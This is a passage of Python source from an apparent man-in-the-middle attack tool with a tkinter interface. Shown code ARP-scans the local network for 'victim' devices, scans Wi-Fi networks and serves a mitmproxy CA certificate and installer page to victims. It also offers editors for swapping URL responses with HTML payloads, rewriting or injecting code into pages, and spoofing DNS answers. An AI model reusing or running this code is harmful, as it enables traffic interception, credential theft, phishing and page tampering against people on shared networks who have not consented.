            if 'subnet mask' in line.lower() or 'маска подсети' in line.lower():
                return line.split(':')[-1].strip()
        return '255.255.255.0'
    def get_host_by_ip(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except (socket.herror, socket.gaierror):
            return '[unknown]'
    def get_ip_by_host(self, host):
        try:
            return socket.gethostbyname(host)
        except (socket.herror, socket.gaierror):
            return '127.0.0.1'
    def get_system_cp(self):
        kernel32=ctypes.WinDLL('kernel32')
        kernel32.AttachConsole(-1)
        cp=kernel32.GetConsoleOutputCP()
        if cp==0:
            cp=kernel32.GetACP()
        return cp
    def arp_scan(self, ip_range):
        while not self.stop_arp_scan_event.is_set():
            try:
                ans=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_range), timeout=2, retry=1, verbose=0)[0]
                for sent, recvd in ans:
                    ip=recvd.psrc
                    mac=recvd.hwsrc
                    if ip==self.gateway_ip or ip==self.my_ip:
                        continue
                    device=self.get_host_by_ip(ip)
                    if ip not in self.devices:
                        self.devices[ip]={'mac': mac, 'device': device}
                    if f'{ip} - {device}' not in self.devices_to_display:
                        self.devices_to_display.append(f'{ip} - {device}')
                        self.devices_to_display.sort(key=lambda x: ipaddress.ip_address(x.split(' - ')[0]))
                        try:
                            if self.master.winfo_exists():
                                self.victim_device.after(0, lambda: self.victim_device.config(values=self.devices_to_display))
                        except (tkinter.TclError, RuntimeError):
                            pass
            except OSError:
                if self.stop_arp_scan_event.wait(1):
                    return
                continue
            if self.stop_arp_scan_event.wait(3):
                return
    def wifi_scan(self):
        while not self.stop_wifi_scan_event.is_set():
            if not self.ifaces:
                return
            try:
                self.ifaces[0].scan()
                if self.stop_wifi_scan_event.wait(5):
                    return
                results=self.ifaces[0].scan_results()
                for network in results:
                    bssid=network.bssid.rstrip(':')
                    ssid=network.ssid.strip().encode('raw_unicode_escape').decode('utf-8', errors='ignore')
                    if not ssid:
                        ssid=f'[hidden network]'
                    self.wifis[bssid]={'ssid': ssid, 'signal': network.signal, 'frequency': network.freq, 'auth': network.auth, 'akm': network.akm, 'cipher': network.cipher}
                    if f'{bssid} - {ssid}' not in self.wifis_to_display:
                        self.wifis_to_display.append(f'{bssid} - {ssid}')
                        self.wifis_to_display.sort(key=lambda x: x.split(' - ')[1])
            except ValueError:
                if self.stop_wifi_scan_event.wait(1):
                    return
                continue
    def handle_cert_victim(self, conn, addr):
        try:
            request=conn.recv(4096).decode('utf-8', errors='ignore')
            if not request:
                conn.close()
                return
            first_line=request.split('\r\n')[0]
            first_line=first_line.split(' ')
            if len(first_line)<2:
                conn.sendall(b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: 22\r\n\r\nMalformed Request Line')
                conn.close()
                return
            method=first_line[0]
            path=first_line[1]
            if method=='GET':
                if path=='/portalCA.pem':
                    with open(self.mitmproxy_ca_certificate_path, 'rb') as f:
                        content=f.read()
                    content_length=len(content)
                    current_time=datetime.now(timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
                    last_modified_time=datetime.fromtimestamp(os.path.getmtime(self.mitmproxy_ca_certificate_path), timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
                    conn.sendall(f'HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Disposition: attachment; filename="portalCA.pem"\r\nContent-Length: {content_length}\r\nDate: {current_time}\r\nLast-Modified: {last_modified_time}\r\n\r\n'.encode('utf-8')+content)
                else:
                    with open(self.cert_installer_path, 'rb') as f:
                        content=f.read()
                    content_length=len(content)
                    conn.sendall(f'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {content_length}\r\n\r\n'.encode('utf-8')+content)
            else:
                conn.sendall(b'HTTP/1.1 405 Method Not Allowed\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: 18\r\n\r\nMethod Not Allowed')
        except Exception as e:
            self.inform_user(f'Error while handling certificate request from victim {addr[0]}: {e}', 'error')
        finally:
            conn.close()
    def cert_installer(self, host, port):
        self.kill_server_process(port)
        self.cert_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.cert_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.cert_socket.bind((host, port))
        self.cert_socket.listen(24)
        while not self.stop_cert_event.is_set():
            try:
                conn, addr=self.cert_socket.accept()
                threading.Thread(target=self.handle_cert_victim, args=(conn, addr), daemon=True).start()
            except OSError:
                break
    def validate_digit_only(self, P):
        if P.isdigit() or P=='':
            return True
        else:
            return False
    def normalize_url(self, raw_url):
        if not raw_url:
            return ''
        raw_url=re.sub(r'^([a-zA-Z]+)/+', r'\1://', raw_url)
        if '://' not in raw_url:
            raw_url='http://'+raw_url
        parsed=urlparse(raw_url)
        clean_url=urlunparse((parsed.scheme, parsed.netloc, parsed.path if parsed.path else '/', '', '', ''))
        return clean_url
    def remove_child_window(self, window):
        if window in self.child_windows:
            try:
                window.destroy()
            except (tkinter.TclError, Exception):
                pass
        self.child_windows.remove(window)
    def close_all_app(self, main_root):
        self.stop_intercepting()
        if not self.stop_arp_scan_event.is_set():
            self.stop_arp_scan_event.set()
        if not self.stop_wifi_scan_event.is_set():
            self.stop_wifi_scan_event.set()
        if not self.stop_wifi_crack_event.is_set():
            self.stop_wifi_crack_event.set()
        if self.mitm_process and self.mitm_process.poll() is None:
            self.mitm_process.terminate()
            subprocess.run('netsh interface portproxy delete v4tov4 listenport=80 listenaddress=0.0.0.0', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run('netsh interface portproxy delete v4tov4 listenport=443 listenaddress=0.0.0.0', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            self.mitm_process=None
            self.is_mitmproxy=False
        for temp_file in [self.dns_rules_path, self.url_rules_path, self.html_rules_path, self.is_spying_path, self.html_inject_path, self.snarpof_actions_path, self.html2canvas_path, self.target_ip_path]:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        for window in self.child_windows:
            window.destroy()
        main_root.destroy()
    def get_wifi_adapter_name(self):
        if not self.ifaces:
            return None
        interface_name=self.ifaces[0].name()
        for iface in conf.ifaces.values():
            if interface_name in iface.description or interface_name in iface.name:
                return iface
        return conf.iface
    def is_connected(self):
        if not self.ifaces:
            return None
        if self.ifaces[0].status()==4:
            return True
        return False
    def get_mac(self, ip):
        if ip in self.devices:
            return self.devices[ip]['mac']
        else:
            ans, _=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        return None
    def address_info(self, target):
        try:
            ip_address=socket.gethostbyname(target)
        except (socket.herror, socket.gaierror, UnicodeError) as e:
            self.inform_user(f'Error while resolving domain {target}: {e}', 'error')
            return
        webbrowser.open(f'https://extreme-ip-lookup.com/{ip_address}')
    def clear_victim_devices(self):
        self.devices_to_display=[]
        self.victim_device.set('ATTENTION - select victim\'s device here, list updates are paused while the dropdown is open ...')
        self.victim_device.config(values=self.devices_to_display)
        self.victim_device.selection_clear()
    def close_url_responder(self, window):
        self.url_responder_button.config(state=tkinter.NORMAL)
        self.remove_child_window(window)
    def url_responder(self):
        self.url_responder_button.config(state=tkinter.DISABLED)
        urlresp_window=CTk()
        urlresp_window.title('URLresp')
        urlresp_window.iconbitmap(os.path.join(self.base_path, 'icon.ico'))
        urlresp_window.geometry('700x600')
        self.child_windows.append(urlresp_window)
        urlresp_window.protocol('WM_DELETE_WINDOW', lambda: self.close_url_responder(urlresp_window))
        style=ttk.Style(urlresp_window)
        style.theme_use('default')
        style.configure('TScrollbar', background=self.DARK_BG, troughcolor=self.BLACK_BG, bordercolor=self.LIME_FG, arrowcolor=self.LIME_FG, relief=tkinter.FLAT, troughrelief=tkinter.FLAT)
        style.map('TScrollbar', background=[('active', self.LIME_FG), ('pressed', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG), ('pressed', self.DARK_BG)])
        style.configure('TEntry', fieldbackground=self.BLACK_BG, foreground=self.LIME_FG, insertcolor=self.LIME_FG, borderwidth=1, bordercolor=self.LIME_FG, selectbackground=self.LIME_FG, selectforeground=self.DARK_BG)
        style.map('TEntry', fieldbackground=[('focus', self.BLACK_BG)], foreground=[('focus', self.LIME_FG)])
        def on_select(event):
            w=event.widget
            if w.curselection():
                item=w.get(w.curselection()[0]).split(' -> ')
                url=item[0]
                payload=item[1]
                target_url.delete(0, tkinter.END)
                target_url.insert(0, url)
                html_payload.delete(0, tkinter.END)
                html_payload.insert(0, payload)
        main_frame=tkinter.Frame(urlresp_window, bg=self.BLACK_BG, relief=tkinter.SUNKEN, borderwidth=1)
        main_frame.pack(fill='both', expand=True)
        tkinter.Label(main_frame, text='URLresp', fg=self.LIME_FG, bg=self.BLACK_BG, font=('Consolas', 30, 'bold')).pack(pady=5)
        resp_info_frame=tkinter.Frame(main_frame, bg=self.DARK_BG, relief=tkinter.SUNKEN, borderwidth=0)
        resp_info_frame.pack(padx=10, pady=10, fill='both', expand=True)
        v_scrollbar=ttk.Scrollbar(resp_info_frame, orient='vertical', style='TScrollbar')
        v_scrollbar.pack(side='right', fill='y')
        urlresp_listbox=tkinter.Listbox(resp_info_frame, yscrollcommand=v_scrollbar.set, bg=self.BLACK_BG, fg=self.LIME_FG, font=('Consolas', 10, 'bold'), selectbackground=self.LIME_FG, selectforeground=self.BLACK_BG, cursor='arrow', relief=tkinter.SUNKEN, highlightbackground=self.DARK_BG, highlightcolor=self.DARK_BG, exportselection=False)
        urlresp_listbox.pack(side='left', fill='both', expand=True)
        urlresp_listbox.bind('<<ListboxSelect>>', on_select)
        for url, payload in self.url_respond_dict.items():
            urlresp_listbox.insert(tkinter.END, f'{url} -> {payload}')
        v_scrollbar.config(command=urlresp_listbox.yview)
        input_frame=tkinter.Frame(main_frame, bg=self.BLACK_BG)
        input_frame.pack(pady=10, fill='x', padx=20)
        for i in range(8):
            if i%2!=0:
                input_frame.grid_columnconfigure(i, weight=1)
            else:
                input_frame.grid_columnconfigure(i, weight=0)
        tkinter.Label(input_frame, text='Target URL: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.VICTIM_FONT).grid(row=0, column=0, pady=5, sticky='e')
        tkinter.Label(input_frame, text='HTML payload: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.VICTIM_FONT).grid(row=1, column=0, pady=5, sticky='e')
        target_url=ttk.Entry(input_frame, font=self.ENTRY_FONT, style='TEntry')
        target_url.grid(row=0, column=1, columnspan=10, padx=5, pady=5, sticky='ew')
        html_payload=ttk.Entry(input_frame, font=self.ENTRY_FONT, style='TEntry')
        html_payload.grid(row=1, column=1, columnspan=10, padx=5, pady=5, sticky='ew')
        def add_rule():
            url=target_url.get()
            payload=html_payload.get()
            if url and payload:
                url=self.normalize_url(url)
                if url not in self.url_respond_dict:
                    self.url_respond_dict[url]=payload
                    urlresp_listbox.insert(tkinter.END, f'{url} -> {payload}')
                    target_url.delete(0, tkinter.END)
                    html_payload.delete(0, tkinter.END)
                    with open(self.url_rules_path, 'w', encoding='utf-8') as f:
                        json.dump(self.url_respond_dict, f, indent=4)
        def delete_rule():
            selected_item=urlresp_listbox.curselection()
            if selected_item:
                index=selected_item[0]
                item=urlresp_listbox.get(index)
                url=item.split(' -> ')[0]
                if url in self.url_respond_dict:
                    del self.url_respond_dict[url]
                    urlresp_listbox.delete(index)
                    target_url.delete(0, tkinter.END)
                    html_payload.delete(0, tkinter.END)
                    with open(self.url_rules_path, 'w', encoding='utf-8') as f:
                        json.dump(self.url_respond_dict, f, indent=4)
        def edit_rule():
            url=target_url.get()
            payload=html_payload.get()
            selected_item=urlresp_listbox.curselection()
            if url and payload and selected_item:
                selected_url=urlresp_listbox.get(selected_item[0]).split(' -> ')[0]
                index=selected_item[0]
                url=self.normalize_url(url)
                if selected_url in self.url_respond_dict:
                    del self.url_respond_dict[selected_url]
                self.url_respond_dict[url]=payload
                urlresp_listbox.delete(index)
                urlresp_listbox.insert(index, f'{url} -> {payload}')
                target_url.delete(0, tkinter.END)
                html_payload.delete(0, tkinter.END)
                with open(self.url_rules_path, 'w', encoding='utf-8') as f:
                    json.dump(self.url_respond_dict, f, indent=4)
        buttons_frame=tkinter.Frame(main_frame, bg=self.BLACK_BG)
        buttons_frame.pack(side='bottom', fill='x', pady=10)
        for i in range(3):
            buttons_frame.grid_columnconfigure(i, weight=1)
        add_button=tkinter.Button(buttons_frame, text='Add', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=add_rule)
        add_button.bind('<Enter>', lambda e: add_button.config(bg=self.BUTTON_HOVER))
        add_button.bind('<Leave>', lambda e: add_button.config(bg=self.BLACK_BG))
        add_button.grid(row=0, column=0, padx=10, sticky='nsew')
        delete_button=tkinter.Button(buttons_frame, text='Delete', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=delete_rule)
        delete_button.bind('<Enter>', lambda e: delete_button.config(bg=self.BUTTON_HOVER))
        delete_button.bind('<Leave>', lambda e: delete_button.config(bg=self.BLACK_BG))
        delete_button.grid(row=0, column=1, padx=10, sticky='nsew')
        edit_button=tkinter.Button(buttons_frame, text='Edit', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=edit_rule)
        edit_button.bind('<Enter>', lambda e: edit_button.config(bg=self.BUTTON_HOVER))
        edit_button.bind('<Leave>', lambda e: edit_button.config(bg=self.BLACK_BG))
        edit_button.grid(row=0, column=2, padx=10, sticky='nsew')
        urlresp_window.mainloop()
    def close_html_replacer(self):
        self.html_replacer_button.config(state=tkinter.NORMAL)
        self.remove_child_window(self.htmlrep_window)
        self.htmlrep_window=None
    def html_replacer(self):
        if self.mitm_process is None:
            self.inform_user('Error while starting HTMLrep: mitmproxy must be enabled first', 'error')
            return
        self.html_replacer_button.config(state=tkinter.DISABLED)
        self.htmlrep_window=CTk()
        self.htmlrep_window.title('HTMLrep')
        self.htmlrep_window.iconbitmap(os.path.join(self.base_path, 'icon.ico'))
        self.htmlrep_window.geometry('700x600')
        self.child_windows.append(self.htmlrep_window)
        self.htmlrep_window.protocol('WM_DELETE_WINDOW', self.close_html_replacer)
        style=ttk.Style(self.htmlrep_window)
        style.theme_use('default')
        style.configure('TScrollbar', background=self.DARK_BG, troughcolor=self.BLACK_BG, bordercolor=self.LIME_FG, arrowcolor=self.LIME_FG, relief=tkinter.FLAT, troughrelief=tkinter.FLAT)
        style.map('TScrollbar', background=[('active', self.LIME_FG), ('pressed', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG), ('pressed', self.DARK_BG)])
        style.configure('TEntry', fieldbackground=self.BLACK_BG, foreground=self.LIME_FG, insertcolor=self.LIME_FG, borderwidth=1, bordercolor=self.LIME_FG, selectbackground=self.LIME_FG, selectforeground=self.DARK_BG)
        style.map('TEntry', fieldbackground=[('focus', self.BLACK_BG)], foreground=[('focus', self.LIME_FG)])
        def on_select(event):
            w=event.widget
            if w.curselection():
                item=w.get(w.curselection()[0]).split(' -> ')
                content=item[0]
                replacement=item[1]
                target_content.delete(0, tkinter.END)
                target_content.insert(0, content)
                content_replacement.delete(0, tkinter.END)
                content_replacement.insert(0, replacement)
        main_frame=tkinter.Frame(self.htmlrep_window, bg=self.BLACK_BG, relief=tkinter.SUNKEN, borderwidth=1)
        main_frame.pack(fill='both', expand=True)
        tkinter.Label(main_frame, text='HTMLrep', fg=self.LIME_FG, bg=self.BLACK_BG, font=('Consolas', 30, 'bold')).pack(pady=5)
        rep_info_frame=tkinter.Frame(main_frame, bg=self.DARK_BG, relief=tkinter.SUNKEN, borderwidth=0)
        rep_info_frame.pack(padx=10, pady=10, fill='both', expand=True)
        v_scrollbar=ttk.Scrollbar(rep_info_frame, orient='vertical', style='TScrollbar')
        v_scrollbar.pack(side='right', fill='y')
        htmlrep_listbox=tkinter.Listbox(rep_info_frame, yscrollcommand=v_scrollbar.set, bg=self.BLACK_BG, fg=self.LIME_FG, font=('Consolas', 10, 'bold'), selectbackground=self.LIME_FG, selectforeground=self.BLACK_BG, cursor='arrow', relief=tkinter.SUNKEN, highlightbackground=self.DARK_BG, highlightcolor=self.DARK_BG, exportselection=False)
        htmlrep_listbox.pack(side='left', fill='both', expand=True)
        htmlrep_listbox.bind('<<ListboxSelect>>', on_select)
        for content, replacement in self.html_replacer_dict.items():
            htmlrep_listbox.insert(tkinter.END, f'{content} -> {replacement}')
        v_scrollbar.config(command=htmlrep_listbox.yview)
        input_frame=tkinter.Frame(main_frame, bg=self.BLACK_BG)
        input_frame.pack(pady=10, fill='x', padx=20)
        for i in range(8):
            if i%2!=0:
                input_frame.grid_columnconfigure(i, weight=1)
            else:
                input_frame.grid_columnconfigure(i, weight=0)
        tkinter.Label(input_frame, text='Target content: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.VICTIM_FONT).grid(row=0, column=0, pady=5, sticky='e')
        tkinter.Label(input_frame, text='Content replacement: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.VICTIM_FONT).grid(row=1, column=0, pady=5, sticky='e')
        target_content=ttk.Entry(input_frame, font=self.ENTRY_FONT, style='TEntry')
        target_content.grid(row=0, column=1, columnspan=10, padx=5, pady=5, sticky='ew')
        content_replacement=ttk.Entry(input_frame, font=self.ENTRY_FONT, style='TEntry')
        content_replacement.grid(row=1, column=1, columnspan=10, padx=5, pady=5, sticky='ew')
        def add_rule():
            content=target_content.get()
            replacement=content_replacement.get()
            if content and replacement:
                if content not in self.html_replacer_dict:
                    self.html_replacer_dict[content]=replacement
                    htmlrep_listbox.insert(tkinter.END, f'{content} -> {replacement}')
                    target_content.delete(0, tkinter.END)
                    content_replacement.delete(0, tkinter.END)
                    with open(self.html_rules_path, 'w', encoding='utf-8') as f:
                        json.dump(self.html_replacer_dict, f, indent=4)
        def delete_rule():
            selected_item=htmlrep_listbox.curselection()
            if selected_item:
                index=selected_item[0]
                item=htmlrep_listbox.get(index)
                content=item.split(' -> ')[0]
                if content in self.html_replacer_dict:
                    del self.html_replacer_dict[content]
                    htmlrep_listbox.delete(index)
                    target_content.delete(0, tkinter.END)
                    content_replacement.delete(0, tkinter.END)
                    with open(self.html_rules_path, 'w', encoding='utf-8') as f:
                        json.dump(self.html_replacer_dict, f, indent=4)
        def edit_rule():
            content=target_content.get()
            replacement=content_replacement.get()
            selected_item=htmlrep_listbox.curselection()
            if content and replacement and selected_item:
                selected_content=htmlrep_listbox.get(selected_item[0]).split(' -> ')[0]
                index=selected_item[0]
                if selected_content in self.html_replacer_dict:
                    del self.html_replacer_dict[selected_content]
                self.html_replacer_dict[content]=replacement
                htmlrep_listbox.delete(index)
                htmlrep_listbox.insert(index, f'{content} -> {replacement}')
                target_content.delete(0, tkinter.END)
                content_replacement.delete(0, tkinter.END)
                with open(self.html_rules_path, 'w', encoding='utf-8') as f:
                    json.dump(self.html_replacer_dict, f, indent=4)
        buttons_frame=tkinter.Frame(main_frame, bg=self.BLACK_BG)
        buttons_frame.pack(side='bottom', fill='x', pady=10)
        for i in range(3):
            buttons_frame.grid_columnconfigure(i, weight=1)
        add_button=tkinter.Button(buttons_frame, text='Add', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=add_rule)
        add_button.bind('<Enter>', lambda e: add_button.config(bg=self.BUTTON_HOVER))
        add_button.bind('<Leave>', lambda e: add_button.config(bg=self.BLACK_BG))
        add_button.grid(row=0, column=0, padx=10, sticky='nsew')
        delete_button=tkinter.Button(buttons_frame, text='Delete', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=delete_rule)
        delete_button.bind('<Enter>', lambda e: delete_button.config(bg=self.BUTTON_HOVER))
        delete_button.bind('<Leave>', lambda e: delete_button.config(bg=self.BLACK_BG))
        delete_button.grid(row=0, column=1, padx=10, sticky='nsew')
        edit_button=tkinter.Button(buttons_frame, text='Edit', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=edit_rule)
        edit_button.bind('<Enter>', lambda e: edit_button.config(bg=self.BUTTON_HOVER))
        edit_button.bind('<Leave>', lambda e: edit_button.config(bg=self.BLACK_BG))
        edit_button.grid(row=0, column=2, padx=10, sticky='nsew')
        self.htmlrep_window.mainloop()
    def close_html_injector(self):
        self.html_injector_button.config(state=tkinter.NORMAL)
        self.remove_child_window(self.htmlinj_window)
        self.htmlinj_window=None
    def html_injector(self):
        if self.mitm_process is None:
            self.inform_user('Error while starting HTMLinj: mitmproxy must be enabled first', 'error')
            return
        self.html_injector_button.config(state=tkinter.DISABLED)
        self.htmlinj_window=CTk()
        self.htmlinj_window.title('HTMLinj')
        self.htmlinj_window.iconbitmap(os.path.join(self.base_path, 'icon.ico'))
        self.htmlinj_window.geometry('700x600')
        self.child_windows.append(self.htmlinj_window)
        self.htmlinj_window.protocol('WM_DELETE_WINDOW', self.close_html_injector)
        style=ttk.Style(self.htmlinj_window)
        style.theme_use('default')
        style.configure('TScrollbar', background=self.DARK_BG, troughcolor=self.BLACK_BG, bordercolor=self.LIME_FG, arrowcolor=self.LIME_FG, relief=tkinter.FLAT, troughrelief=tkinter.FLAT)
        style.map('TScrollbar', background=[('active', self.LIME_FG), ('pressed', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG), ('pressed', self.DARK_BG)])
        def changes(event):
            if not htmlinj_text.edit_modified():
                return
            self.html_inject_code=htmlinj_text.get('1.0', 'end-1c')
            if self.is_htmlinj_saved:
                save_button.config(text='Save', state=tkinter.NORMAL)
                self.is_htmlinj_saved=False
            htmlinj_text.edit_modified(False)
        def save_injection_code(event=None):
            with open(self.html_inject_path, 'w', encoding='utf-8') as f:
                f.write(self.html_inject_code)
            self.is_htmlinj_saved=True
            save_button.config(text='Saved', state=tkinter.DISABLED)
        main_frame=tkinter.Frame(self.htmlinj_window, bg=self.BLACK_BG, relief=tkinter.SUNKEN, borderwidth=1)
        main_frame.pack(fill='both', expand=True)
        tkinter.Label(main_frame, text='HTMLinj', fg=self.LIME_FG, bg=self.BLACK_BG, font=('Consolas', 30, 'bold')).pack(pady=5)
        htmlinj=tkinter.Frame(main_frame, bg=self.DARK_BG, relief=tkinter.SUNKEN, borderwidth=0)
        htmlinj.pack(pady=10, padx=10, fill='both', expand=True)
        v_scrollbar=ttk.Scrollbar(htmlinj, orient='vertical', style='TScrollbar')
        v_scrollbar.pack(side='right', fill='y')
        htmlinj_text=tkinter.Text(htmlinj, wrap='word', yscrollcommand=v_scrollbar.set, bg=self.BLACK_BG, fg='#00FFFF', font=('Consolas', 9), selectbackground='#00FFFF', selectforeground=self.BLACK_BG, insertbackground='#00FFFF', state=tkinter.NORMAL, cursor='xterm')
        htmlinj_text.bind('<<Modified>>', changes)
        htmlinj_text.bind('<Control-s>', save_injection_code)
        htmlinj_text.bind('<Control-S>', save_injection_code)
        htmlinj_text.pack(side='left', fill='both', expand=True)
        v_scrollbar.config(command=htmlinj_text.yview)
        if self.html_inject_code=='':
            htmlinj_text.insert(tkinter.END, '<!-- Enter your injection code here, and click \'Save\' button --!>')
        else:
            htmlinj_text.insert(tkinter.END, self.html_inject_code)
        htmlinj_text.edit_modified(False)
        save_button=tkinter.Button(main_frame, bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), command=save_injection_code, width=12, disabledforeground='#FFD700')
        save_button.bind('<Enter>', lambda e: save_button.config(bg=self.BUTTON_HOVER))
        save_button.bind('<Leave>', lambda e: save_button.config(bg=self.BLACK_BG))
        if self.is_htmlinj_saved:
            save_button.config(text='Saved', state=tkinter.DISABLED)
        else:
            save_button.config(text='Save', state=tkinter.NORMAL)
        save_button.pack(pady=10, fill='x', padx=10)
        self.htmlinj_window.after(100, htmlinj_text.focus_set)
        self.htmlinj_window.mainloop()
    def close_dns_spoofer(self, window):
        self.dns_spoofer_button.config(state=tkinter.NORMAL)
        self.remove_child_window(window)
    def dns_spoofer(self):
        self.dns_spoofer_button.config(state=tkinter.DISABLED)
        dnspoof_window=CTk()
        dnspoof_window.title('DNSpoof')
        dnspoof_window.iconbitmap(os.path.join(self.base_path, 'icon.ico'))
        dnspoof_window.geometry('700x600')
        self.child_windows.append(dnspoof_window)
        dnspoof_window.protocol('WM_DELETE_WINDOW', lambda: self.close_dns_spoofer(dnspoof_window))
        style=ttk.Style(dnspoof_window)
        style.theme_use('default')
        style.configure('TScrollbar', background=self.DARK_BG, troughcolor=self.BLACK_BG, bordercolor=self.LIME_FG, arrowcolor=self.LIME_FG, relief=tkinter.FLAT, troughrelief=tkinter.FLAT)
        style.map('TScrollbar', background=[('active', self.LIME_FG), ('pressed', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG), ('pressed', self.DARK_BG)])
        style.configure('TEntry', fieldbackground=self.BLACK_BG, foreground=self.LIME_FG, insertcolor=self.LIME_FG, borderwidth=1, bordercolor=self.LIME_FG, selectbackground=self.LIME_FG, selectforeground=self.DARK_BG)
        style.map('TEntry', fieldbackground=[('focus', self.BLACK_BG)], foreground=[('focus', self.LIME_FG)])
        def on_select(event):
            w=event.widget
            if w.curselection():
                item=w.get(w.curselection()[0]).split(' -> ')
                domain=item[0]
                spfip=item[1]
                target_domain.delete(0, tkinter.END)
                target_domain.insert(0, domain)
                spoofed_ip.delete(0, tkinter.END)
                spoofed_ip.insert(0, spfip)
        main_frame=tkinter.Frame(dnspoof_window, bg=self.BLACK_BG, relief=tkinter.SUNKEN, borderwidth=1)
        main_frame.pack(fill='both', expand=True)
        tkinter.Label(main_frame, text='DNSpoof', fg=self.LIME_FG, bg=self.BLACK_BG, font=('Consolas', 30, 'bold')).pack(pady=5)
        spoof_info_frame=tkinter.Frame(main_frame, bg=self.DARK_BG, relief=tkinter.SUNKEN, borderwidth=0)
        spoof_info_frame.pack(padx=10, pady=10, fill='both', expand=True)
        v_scrollbar=ttk.Scrollbar(spoof_info_frame, orient='vertical', style='TScrollbar')
        v_scrollbar.pack(side='right', fill='y')
        dnspoof_listbox=tkinter.Listbox(spoof_info_frame, yscrollcommand=v_scrollbar.set, bg=self.BLACK_BG, fg=self.LIME_FG, font=('Consolas', 10, 'bold'), selectbackground=self.LIME_FG, selectforeground=self.BLACK_BG, cursor='arrow', relief=tkinter.SUNKEN, highlightbackground=self.DARK_BG, highlightcolor=self.DARK_BG, exportselection=False)
        dnspoof_listbox.pack(side='left', fill='both', expand=True)
        dnspoof_listbox.bind('<<ListboxSelect>>', on_select)
        for domain, spfip in self.dns_spoof_dict.items():
            dnspoof_listbox.insert(tkinter.END, f'{domain} -> {spfip}')
        v_scrollbar.config(command=dnspoof_listbox.yview)
        input_frame=tkinter.Frame(main_frame, bg=self.BLACK_BG)
        input_frame.pack(pady=10, fill='x', padx=20)
        for i in range(8):
            if i%2!=0:
                input_frame.grid_columnconfigure(i, weight=1)
            else:
                input_frame.grid_columnconfigure(i, weight=0)
        tkinter.Label(input_frame, text='Target domain: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.VICTIM_FONT).grid(row=0, column=0, pady=5, sticky='e')
        tkinter.Label(input_frame, text='Spoofed IP: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.VICTIM_FONT).grid(row=1, column=0, pady=5, sticky='e')
        target_domain=ttk.Entry(input_frame, font=self.ENTRY_FONT, style='TEntry')
        target_domain.grid(row=0, column=1, columnspan=10, padx=5, pady=5, sticky='ew')
        spoofed_ip=ttk.Entry(input_frame, font=self.ENTRY_FONT, style='TEntry')
        spoofed_ip.grid(row=1, column=1, columnspan=10, padx=5, pady=5, sticky='ew')
        def add_rule():
            domain=target_domain.get()
            spfip=spoofed_ip.get()
            if domain and spfip:
                if domain not in self.dns_spoof_dict:
                    spfip=self.get_ip_by_host(spfip)
                    self.dns_spoof_dict[domain]=spfip
                    dnspoof_listbox.insert(tkinter.END, f'{domain} -> {spfip}')
                    target_domain.delete(0, tkinter.END)
                    spoofed_ip.delete(0, tkinter.END)
                    with open(self.dns_rules_path, 'w', encoding='utf-8') as f:
                        json.dump(self.dns_spoof_dict, f, indent=4)
        def delete_rule():
            selected_item=dnspoof_listbox.curselection()
            if selected_item:
                index=selected_item[0]
                item=dnspoof_listbox.get(index)
                domain=item.split(' -> ')[0]
                if domain in self.dns_spoof_dict:
                    del self.dns_spoof_dict[domain]
                    dnspoof_listbox.delete(index)
                    target_domain.delete(0, tkinter.END)
